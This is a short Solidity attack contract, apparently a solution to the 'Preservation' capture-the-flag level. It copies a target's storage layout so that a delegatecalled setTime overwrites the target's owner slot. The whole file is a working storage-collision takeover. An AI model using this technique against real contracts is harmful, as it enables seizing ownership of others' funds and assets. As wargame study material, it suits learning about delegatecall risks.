pragma solidity ^0.6.0;

contract PreservationAttack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
    owner = address(_time);
    }
}